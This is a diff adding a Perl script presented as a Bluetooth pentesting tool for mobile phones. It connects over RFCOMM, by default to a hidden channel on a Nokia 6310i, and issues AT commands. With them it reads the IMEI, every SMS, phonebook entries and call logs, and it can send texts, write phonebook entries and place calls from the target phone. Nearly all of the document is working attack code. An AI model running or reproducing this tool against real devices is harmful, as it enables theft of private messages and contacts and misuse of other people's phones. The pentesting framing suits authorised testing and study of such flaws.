@@ -1,0 +1,559 @@
+#!/usr/bin/perl  
+# 
+# bluetooth hacking tool
+#
+# written by pierre kroma 
+# kroma@syss.de
+
+use Device::Gsm;
+use Getopt::Std;
+use Term::ReadLine;
+use Device::Modem;
+use Term::ANSIColor;
+
+
+############################ U S A G E ###################################
+getopts("bcpsv", \%args);
+
+system ("clear");
+print "\nBluetooth Pentester\n";
+print "written by pierre kroma (kroma\@syss.de)\n\n";
+
+if (!defined $args{s})  {
+print qq~
+Usage: perl bluetest.pl -s { -b <bt-addr> -c channel -p -v }
+        -b <bt-addr>   = hardware address of the target bluetooth device (example: 00:11:22:33:44:55)
+        -c <channel>   = channel
+	-p 	       = ping the remote device
+	-s 	       = start the script
+        -v             = be verbose
+
+~; exit;}
+
+
+################################## D E F I N I T I O N ####################
+# tools
+my $hcitool="/usr/bin/hcitool";
+my $l2ping ="/usr/bin/l2ping";
+my $rfcomm ="/usr/bin/rfcomm";
+my $lsusb = "/usr/sbin/lsusb";
+my $hciconfig = "/usr/sbin/hciconfig";
+my $bluefw = "/sbin/bluefw";
+
+# variable
+my $bluedev="hci0";
+my $bt_addr = 0;
+my $channel = $args{c};
+my $i = 0;
+
+
+
+#################### S U B R O U T I N E S #################################
+
+sub init_adapter
+{
+	use strict;
+
+	my $busnum = "";
+	my $devnum = "";
+	# busid 0a12:0001 = linksys USBBT100 usb bluetooth stick
+	my $id = `$lsusb 2>/dev/null |grep 0a12:0001`;
+	# more generic
+	# my $id = `$lsusb 2>/dev/null |grep -i bluetooth`;
+
+	if ( $id =~ /Bus (\d{3}) Device (\d{3}): ID 0a12:0001/ ) 
+	{
+		$busnum = $1;
+		$devnum = $2;
+		system("$bluefw usb $busnum\/$devnum");
+		system("$hciconfig $bluedev up");
+		sleep(1.5);
+	}
+}
+
+sub init_modem
+{
+	$modem = new Device::Modem( port => '/dev/rfcomm0' );
+	if( $modem->connect( baudrate => 9600 ) ) {
+      		# print "connected!\n";
+  	} else {
+      		print "sorry, cannot connect to your serial port!\n";
+  	}
+	# turn off the local echo
+	$modem->echo(0); 
+}
+
+sub searching 
+{
+	print color 'bold blue';	
+	print "search devices\n";
+	print color 'reset';
+	my @scan = `$hcitool scan | grep -v "Scanning"`;
+	foreach $line (@scan)
+	{
+		print $i++;
+		print $line;
+	}
+	print "\n";
+}
+
+sub selecting
+{
+	# select a device
+	if($args{'b'})
+	{	
+		$bt_addr = $args{b};	
+	}
+	else
+	{
+		$term = new Term::ReadLine 'bluetooth address reader';
+		my $prompt = "Enter hw-addr (example: 00:11:22:33:44:55): ";
+		my $OUT = $term->OUT || \*STDOUT;
+		$bt_addr = $term->readline($prompt);
+	}
+}
+
+
+sub ping
+{
+	# ping the remote device
+	if($args{'p'})
+	{
+	    # ping the remote device
+	    print color 'bold blue';
+	    print "\nping the remote device $bt_addr\n";
+	    print color 'reset';
+	    die "You must be root to use l2ping!\n" if $> != 0;
+	    system ("$l2ping -c 5 $bt_addr");
+	}
+}
+
+sub binding
+{
+	# binding a device
+	print color 'bold blue';
+	print "\n\nbind a device to $bt_addr \t\t";
+	print color 'reset';
+	if($args{'c'})
+	{
+		$channel = $args{c};
+	}
+	else
+	{
+		# setting default nokia 6310i hidden channel 17 or 18
+		$channel = 17;
+	}
+
+	system("$rfcomm release $bluedev 2>/dev/null");
+	sleep(2);
+	system("$rfcomm bind $bluedev $bt_addr $channel 2>/dev/null");
+	sleep(2);
+
+	# Connect to the mobile phone
+	# for devfs
+	# my $gsm = new Device::Gsm( port => '/dev/bluetooth/rfcomm/0' );
+
+	# for udev 
+	$gsm = new Device::Gsm( port => '/dev/rfcomm0' );
+
+  	if( $gsm->connect() ) 
+	{
+		print color 'bold green';
+      		print "connected!\n";
+		print color 'reset';
+  	} 
+	else 
+	{
+		print color 'bold red';
+      		print "sorry, no connection with gsm phone on serial port!\n";
+		print color 'reset';
+		exit (1);
+  	}
+
+	# Register to GSM network 
+	$gsm->register();
+}
+
+sub manu
+{
+	# Extract the manufacturer
+	my $man_name = $gsm->manufacturer();
+	print "manufacture: $man_name \n";
+}
+
+sub model
+{
+	# model
+	my $model = $gsm->model();
+	print "model: $model \n";
+}
+
+sub sw
+{
+	# software revision
+	$modem->atsend( 'AT+CGMR' . Device::Modem::CR );
+  	$rev = $modem->answer();
+	$rev =~ s/\r//g;
+	$rev =~ s/OK//g;
+	print "software revision: \n \n $rev";
+	sleep(1);
+}
+
+sub imei
+{
+	# Extract the IMEI number
+	my $imei = $gsm->imei();
+	$imei =~ s/\r//g;
+	$imei =~ s/OK//g;
+	print "IMEI: (International Mobile Equipment Identifier) = $imei \n\n";
+}
+
+
+sub readbook
+{
+	print color 'bold blue';
+	print "\n\nextract the phonebook\n\n";
+	print color 'reset';
+	if($args{'v'})  
+	{
+	print "storagelocation:";
+	print qq~
+ME => storage: device
+SM => storage: SIM-card
+MT => combination of ME + SM (doesn�t work FOR MY 6310i)
+BM => storage: CB-news
+	~;
+	}
+		
+	print "\nsupported storage location";
+	$modem->atsend( 'AT+CPMS=?' . Device::Modem::CR );
+  	$types = $modem->answer();
+	$types =~ s/\r//g;
+        $types =~ s/\n//g;
+	$types =~ s/OK//g;
+	$types =~ s/\+CPMS//g;
+	print "$types \n";
+	
+	print "\ncurrent phonebooksource";
+	$modem->atsend( 'AT+CPBS?' . Device::Modem::CR );
+  	$source = $modem->answer();
+	$source =~ s/\r//g;
+        $source =~ s/\n//g;
+	$source =~ s/OK//g;
+	$source =~ s/\+CPBS//g;
+	print $source;
+	print "\n\n";
+
+	print "\ncurrent used storage on device";
+	$command="AT+CPBS=\"ME\"";
+	$modem->atsend( $command . Device::Modem::CR );
+	$modem->atsend( 'AT+CPBS?' . Device::Modem::CR );
+  	$memory = $modem->answer();
+	$memory =~ s/\r//g;
+        $memory =~ s/\n//g;
+	$memory =~ s/OK//g;
+	$memory =~ s/\+CPBS//g;
+	print $memory;
+
+	print "\ncurrent used storage on SIM";
+	$command="AT+CPBS=\"SM\"";
+	$modem->atsend( $command . Device::Modem::CR );
+	$modem->atsend( 'AT+CPBS?' . Device::Modem::CR );
+  	$source = $modem->answer();
+	$source =~ s/\r//g;
+        $source =~ s/\n//g;
+	$source =~ s/OK//g;
+	$source =~ s/\+CPBS//g;
+	print $source;
+	print "\n\n";
+
+	my $prompt = "What do you want to readout? (ME oder SM) : ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$type = $term->readline($prompt);
+
+	$command = "AT+CPBS=\"$type\"";
+	$modem->atsend( $command . Device::Modem::CR );
+  	$asource = $modem->answer();
+	$asource =~ s/\r//g;
+        $asource =~ s/\n//g;
+	$asource =~ s/OK//g;
+	print $asource;
+
+	my $prompt = "starting from entry (>=0): \t ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$start = $term->readline($prompt);
+	print "\n";
+	my $prompt = "ending to entry:\t\t";
+	my $OUT = $term->OUT || \*STDOUT;
+	$max = $term->readline($prompt);
+	print "\n";
+
+	if ( $start > $max || $start <= '0' )
+	{
+		print "oops damn f*cking long night? \n";
+		print "initial value <= 0? \n";
+		print "or initial value  > final value? \n";
+		exit (1);
+	}
+	list_entries ();
+
+	print "\nextract last 5 dialled numbers: \n";
+	$command = "AT+CPBS=\"DC\"";
+	$modem->atsend( $command . Device::Modem::CR );
+  	$asource = $modem->answer();
+	$asource =~ s/\r//g;
+        $asource =~ s/\n//g;
+	$asource =~ s/OK//g;
+	print $asource;
+	$start=1;
+	$max=5;
+	list_entries ();
+
+	print "\nlast 5 missed calls: \n";
+	$command = "AT+CPBS=\"MC\"";
+	$modem->atsend( $command . Device::Modem::CR );
+  	$asource = $modem->answer();
+	$asource =~ s/\r//g;
+        $asource =~ s/\n//g;
+	$asource =~ s/OK//g;
+	print $asource;
+	$start=1;
+	$max=5;
+	list_entries ();
+
+	print "\nlast 5 received calls: \n";
+	$command = "AT+CPBS=\"RC\"";
+	$modem->atsend( $command . Device::Modem::CR );
+  	$asource = $modem->answer();
+	$asource =~ s/\r//g;
+        $asource =~ s/\n//g;
+	$asource =~ s/OK//g;
+	print $asource;
+	$start=1;
+	$max=5;
+	list_entries ();
+}
+
+sub list_entries
+{
+	$i = $start;
+	foreach $i ( $start..$max )
+	{
+		$command = "AT+CPBR=$i";
+		$modem->atsend( $command . Device::Modem::CR );	
+		$entry = $modem->answer();
+
+		# format
+		$entry =~ s/\r//g;
+        	$entry =~ s/\n//g;
+		$entry =~ s/OK//g;
+
+		# parse
+		# type = 145 = international format = number starts with +
+		# type = 129 = unknown number format = didn't start with +
+
+        	( $pos, $num, $type, $tag ) = $entry =~ m/^\+CPBR: ($i),"(.+?)",(\d+),"(.+)?"\r?$/m;
+
+		$type =~ s/145/international/g;
+		$type =~ s/129/unknown/g;
+	
+		if ( $num == '' )
+		{	
+			print "entry $i: is empty \n";
+		}
+		else
+		{
+			print "entry $i: $num, $type, $tag \n";
+			
+		}
+	}
+}
+
+sub sendsms
+{
+	# Send a text message quickly
+	print color 'bold blue';
+	print "\n\nwrite a message (SMS)\n";
+	print color 'reset';
+	print "\n";
+	my $prompt = "recipient (example +4912345678): ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$recipient = $term->readline($prompt);
+	print "\n";
+
+	my $prompt = "message: ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$message = $term->readline($prompt);
+
+	my $status = $gsm->send_sms(
+	     				recipient => $recipient,
+	     				content   => $message
+				);
+	if ( $status )
+	{	
+		print color 'bold green';
+		print "\nmessage transmitted successfully.\n";
+		print color 'reset';
+	}
+	else
+	{
+		print color 'bold red';
+		print "\nERROR: message couldn`t delivered.\n" ;
+		print color 'reset';
+	}
+	sleep(2);
+}
+
+sub readsms
+{
+	# Get list of device::Gsm::Sms message objects
+	# see `examples/read_messages.pl' for all details
+	
+	# get mode status
+	$modem->atsend( 'AT+CMGF?' . Device::Modem::CR );
+	print color 'bold blue';
+	print "\nSMS Menu";
+	print color 'reset';
+	print "\n \ncurrent sms status (0=PDU, 1=text)";
+  	my $status = $modem->answer();
+	$status =~ s/\r//g;
+        $status =~ s/\n//g;
+	$status =~ s/OK//g;
+	$status =~ s/\+CMGF//g;
+	print $status;
+	sleep(2);
+	
+	# switch to text mode (does not work with 6310i)
+	# print "switch to text mode \n";
+	# $modem->atsend( 'AT+CMGF=1' . Device::Modem::CR );
+  	# print $modem->answer();
+
+	print "\n\nextract all sms \n";	
+	$modem->atsend( 'AT+CMGL=4' . Device::Modem::CR );
+  	my $extract = $modem->answer();
+	$extract =~ s/OK//g;
+	$extract =~ s/\+CMGL://g;
+	sleep(2);
+	print $extract;
+	
+}
+
+sub call
+{
+	# read number	
+	print color 'bold blue';
+	print "\n\nmaking a call\n";
+	print color 'reset';
+	print "\n";
+	my $prompt = "Which number should be called? (example: 004970714078560): ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$number = $term->readline($prompt);
+	print "\ncalling $number \n";	
+	my $max = 20;
+	if (fork)
+	{
+		$modem->dial( $number );
+	}
+	else
+	{
+		print "waiting $max seconds before ring off: ";
+		$i = 0;
+		foreach $i ( 1..$max )
+		{	
+			print "$i ";
+			sleep(1);
+		}
+		print "\n";
+		$modem->hangup();
+	}
+}
+
+sub writebook 
+{
+	print color 'bold blue';
+	print "\ncreate a phonebook entry";
+	print color 'reset';
+	print "\n";
+	my $prompt = "storage space number (ATTENTION: you may overwrite an existing entry:): ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$nr = $term->readline($prompt);
+	print "\n";
+	my $prompt = "phone-number (format +49123456789): ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$tel = $term->readline($prompt);
+	print "\n";
+	my $prompt = "name: ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$name = $term->readline($prompt);
+	print "\n";
+	my $prompt = "storage location (ME=device, SM=SIM): ";
+	my $OUT = $term->OUT || \*STDOUT;
+	$place = $term->readline($prompt);
+
+	$command="AT+CPBS=\"$place\"";
+	$modem->atsend( $command . Device::Modem::CR );
+
+	$command="AT+CPBW=$nr,\"$tel\",145,\"$name\"";
+	$modem->atsend( $command . Device::Modem::CR );
+  	$source = $modem->answer();
+	$source =~ s/\r//g;
+        $source =~ s/\n//g;
+	$source =~ s/OK//g;
+	print $source;
+
+	print "\n\nchecking......";
+	$start = $nr - 5;
+	$max = 5;
+	if ( $start <= 0 )
+	{
+		$start = $nr;
+	}
+	$max = $nr + 5;
+	print "\n extract your phonebook from storage space number $start to $max \n";
+	list_entries ();
+	print "\n";
+}
+
+sub key
+{
+	my $message = "- press any key -";
+	my $OUT = $term->OUT || \*STDOUT;
+	$term->readline($message);
+}
+
+sub final
+{
+	#system ('cat ./logo.txt');
+	print color 'bold red';
+	print "\t\t\t\twritten by pierre kroma (kroma\@syss.de)\n\n";
+	print color 'reset';
+	$modem->disconnect();
+	print "\n";
+}
+	
+
+############################# M A I N ###############################
+
+init_adapter ();
+searching ();
+selecting ();
+ping ();
+binding ();
+init_modem ();
+print color 'bold blue';
+print "\nextract device information\n";
+print color 'reset';
+manu ();
+model ();
+sw ();
+imei ();
+key();
+readsms ();
+sendsms ();
+key ();
+readbook ();
+writebook ();
+key ();
+call ();
+key ();
+final ();
